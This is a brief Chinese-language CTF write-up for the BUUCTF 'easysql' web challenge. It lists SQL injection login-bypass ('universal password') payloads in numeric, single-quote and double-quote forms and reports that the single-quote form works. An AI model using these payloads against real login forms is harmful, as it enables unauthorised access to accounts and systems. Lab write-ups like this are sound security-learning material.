# BUUCTF Web ---[极客大挑战2019]easysql 

> 涉及知识点---sql 万能密码

打开题目 一看帅气的页面 然后让输入用户名和密码 
![image](https://github.com/uicciu/image/blob/main/easysql1.png)
随便输一个吧
![image](https://github.com/uicciu/image/blob/main/easysql2.png)
显示用户名或密码有误 考虑看一下源代码 啥也没看到 再用burpsuit抓一下包看看 也啥也没看到 考虑sql注入

听说有个东西叫万能密码
这里有一部分

【数值型万能账号】

    a or true #

    a or 1 #

    a or 1=1 #

    a or true -- a

    a or 1 -- a

    a or 1=1 -- a

【单引号字符型万能密码】

    a' or true #

    a' or 1 #

    a' or 1=1 #

    a' or true --a

    a' or 1 -- a

    a' or 1=1 -- a

【双引号字符型万能密码】

    a" or true #

    a" or 1 #

    a" or 1=1 #

    a" or true -- a

    a" or 1 -- a

    a" or 1=1 -- a

那万能密码试一试
拿数字型一试
![image](https://github.com/uicciu/image/blob/main/easysql3.png)

发现不行 再找一个 试到了第二种
![image](https://github.com/uicciu/image/blob/main/easysql4.png)

ah 找到了

嘶 但是还是不知道他是指的什么 但是知道了一种方法



